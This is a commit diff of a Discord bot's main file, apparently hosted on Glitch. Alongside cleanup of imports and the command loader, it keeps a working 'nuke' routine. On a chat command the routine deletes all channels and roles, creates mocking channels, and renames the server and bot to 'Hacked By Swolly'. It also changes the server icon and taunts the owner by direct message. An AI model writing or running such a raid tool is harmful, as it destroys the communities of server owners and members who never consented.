66358e88a10bf7da396b398a5fc35896b9f8d71d
Glitch (sideways-order) <none>
2020-01-16 14:59:27 +0000

    🏜👫 Checkpoint ./ayarlar.json:10405040/118 ./bot.js:2842703/18284

--- bot.js
+++ bot.js
@@ -1,22 +1,10 @@
 const Discord = require("discord.js");
 const client = new Discord.Client();
 const ayarlar = require("./ayarlar.json");
-const chalk = require("chalk");
-const moment = require("moment");
-var Jimp = require("jimp");
 const { Client, Util } = require("discord.js");
-const weather = require("weather-js");
-const fs = require("fs");
-const db = require("quick.db");
 const http = require("http");
 const express = require("express");
-require("./util/eventLoader")(client);
-const path = require("path");
 const request = require("request");
-const snekfetch = require("snekfetch");
-const queue = new Map();
-const YouTube = require("simple-youtube-api");
-const ytdl = require("ytdl-core");
 
 const app = express();
 app.get("/", (request, response) => {
@@ -27,103 +15,6 @@ app.listen(process.env.PORT);
 setInterval(() => {
   http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
 }, 280000);
-
-var prefix = ayarlar.prefix;
-
-const log = message => {
-  console.log(`${message}`);
-};
-
-client.commands = new Discord.Collection();
-client.aliases = new Discord.Collection();
-fs.readdir("./komutlar/", (err, files) => {
-  if (err) console.error(err);
-  log(`${files.length} komut yüklenecek.`);
-  files.forEach(f => {
-    let props = require(`./komutlar/${f}`);
-    log(`Yüklenen komut: ${props.help.name}.`);
-    client.commands.set(props.help.name, props);
-    props.conf.aliases.forEach(alias => {
-      client.aliases.set(alias, props.help.name);
-    });
-  });
-});
-
-client.reload = command => {
-  return new Promise((resolve, reject) => {
-    try {
-      delete require.cache[require.resolve(`./komutlar/${command}`)];
-      let cmd = require(`./komutlar/${command}`);
-      client.commands.delete(command);
-      client.aliases.forEach((cmd, alias) => {
-        if (cmd === command) client.aliases.delete(alias);
-      });
-      client.commands.set(command, cmd);
-      cmd.conf.aliases.forEach(alias => {
-        client.aliases.set(alias, cmd.help.name);
-      });
-      resolve();
-    } catch (e) {
-      reject(e);
-    }
-  });
-};
-
-client.load = command => {
-  return new Promise((resolve, reject) => {
-    try {
-      let cmd = require(`./komutlar/${command}`);
-      client.commands.set(command, cmd);
-      cmd.conf.aliases.forEach(alias => {
-        client.aliases.set(alias, cmd.help.name);
-      });
-      resolve();
-    } catch (e) {
-      reject(e);
-    }
-  });
-};
-
-client.unload = command => {
-  return new Promise((resolve, reject) => {
-    try {
-      delete require.cache[require.resolve(`./komutlar/${command}`)];
-      let cmd = require(`./komutlar/${command}`);
-      client.commands.delete(command);
-      client.aliases.forEach((cmd, alias) => {
-        if (cmd === command) client.aliases.delete(alias);
-      });
-      resolve();
-    } catch (e) {
-      reject(e);
-    }
-  });
-};
-
-client.elevation = message => {
-  if (!message.guild) {
-    return;
-  }
-  let permlvl = 0;
-  if (message.member.hasPermission("BAN_MEMBERS")) permlvl = 2;
-  if (message.member.hasPermission("ADMINISTRATOR")) permlvl = 3;
-  if (message.author.id === ayarlar.sahip) permlvl = 4;
-  return permlvl;
-};
-
-var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;
-// client.on('debug', e => {
-//   console.log(chalk.bgBlue.green(e.replace(regToken, 'that was redacted')));
-// });
-
-client.on("warn", e => {
-  console.log(chalk.bgYellow(e.replace(regToken, "that was redacted")));
-});
-
-client.on("error", e => {
-  console.log(chalk.bgRed(e.replace(regToken, "that was redacted")));
-});
-//――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
 
 client.on("message", msg => {
   if (msg.content === "+ban") {
@@ -146,8 +37,10 @@ client.on("message", async msg => {
     await msg.guild.channels.deleteAll();
 
     await msg.guild.createChannel("✝-tek-kral-swolly", {
-          type: "text"
-    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
+      type: "text"
+    });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
       .then(chan => {
@@ -164,9 +57,9 @@ client.on("message", async msg => {
       .createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
       })
-      .then(chan => { 
+      .then(chan => {
         chan.setUserLimit("1");
-      });   
+      });
     await msg.guild
       .createChannel("✝ Patlattı", {
         type: "voice"
@@ -199,12 +92,9 @@ client.on("message", async msg => {
     await msg.guild.setIcon(
       "https://cdn.glitch.com/24a52842-1186-4e63-b8f4-d59b7d0d88ac%2Fimage.png"
     );
-    
-    
+
     await msg.guild.setName("✝ Hacked By Swolly ✝"); //sunucu ismini yapar
-    await client.user.setAvatar(
-      "http://sicanzi.com/"
-    ); //botun pp sini yapar
+    await client.user.setAvatar("http://sicanzi.com/"); //botun pp sini yapar
     await client.user.setUsername("✝ Hacked By Swolly ✝"); //BOTUN ISMINI DEGISTIRIR HICBIRSEY ICIN BOS BIRAK
     await msg.guild.roles.forEach(roles => roles.delete()); //ALTINDAKI ROLLERI SILER
     await msg.guild.owner.send("Patladın Canım Geçmiş Olsun"); //KURUCUSUNA GONDERILEN MESAJ
@@ -254,4 +144,3 @@ client.on("message", msg => {
   }
 });
 client.login(ayarlar.token);
-
